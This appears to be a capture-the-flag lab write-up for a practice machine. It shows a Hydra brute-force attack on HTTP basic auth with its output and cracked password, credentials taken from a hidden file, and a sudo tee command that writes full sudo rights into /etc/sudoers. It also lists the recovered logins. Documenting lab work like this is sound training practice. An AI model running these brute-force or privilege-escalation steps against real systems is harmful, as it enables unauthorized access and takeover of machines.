

```
Password for basic auth (/inferno):
┌─[root@edu-virtualbox]─[/home/edu/THM]
└──╼ #hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 10.10.214.41 -s 80 http-get /inferno -V -R
Hydra v9.5-dev (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[INFORMATION] reading restore file ./hydra.restore
[WARNING] options after -R are now honored (since v8.6)
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-02 16:04:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344400 login tries (l:1/p:14344400), ~896525 tries per task
[DATA] attacking http-get://10.10.214.41:80/inferno

[STATUS] 8564.00 tries/min, 8564 tries in 00:01h, 14335836 to do in 27:54h, 16 active
[STATUS] 4626.33 tries/min, 13879 tries in 00:03h, 14330521 to do in 51:38h, 16 active
[80][http-get] host: 10.10.214.41   login: admin   password: dante1
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-02 16:07:53

```

Found credentials in `/home/dante/Downloads/.download.dat`
```
dante:V1rg1l10h3lpm3
```

Privesc:
```
echo "dante ALL=(ALL) ALL" | sudo /usr/bin/tee -a /etc/sudoers
```

### Credentials
```
admin:dante1   (HTTP BASIC AUTH)
admin:dante1   (CODIAD login page)
dante:V1rg1l10h3lpm3 (SSH)
```